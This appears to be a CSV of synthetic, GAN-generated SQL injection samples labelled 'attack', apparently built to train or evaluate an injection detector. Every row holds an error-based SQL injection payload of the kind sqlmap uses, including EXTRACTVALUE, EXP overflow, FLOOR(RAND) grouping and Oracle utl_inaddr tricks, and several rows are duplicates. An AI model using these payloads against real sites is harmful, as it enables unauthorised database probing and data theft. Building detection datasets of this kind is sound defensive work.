id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.497614705265907
CTGAN_000002,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,6.694966414459961
CTGAN_000003,attack,error,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",nearest_attack_euclidean,R000063,6.060013374099609
CTGAN_000004,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,6.40605672566914
CTGAN_000005,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,7.38757628330979
CTGAN_000006,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000044,6.6525477874386425
CTGAN_000007,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,7.18610419835782
CTGAN_000008,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000047,6.887615621142741
CTGAN_000009,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000011,7.148091281600804
CTGAN_000010,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,5.012099477761023
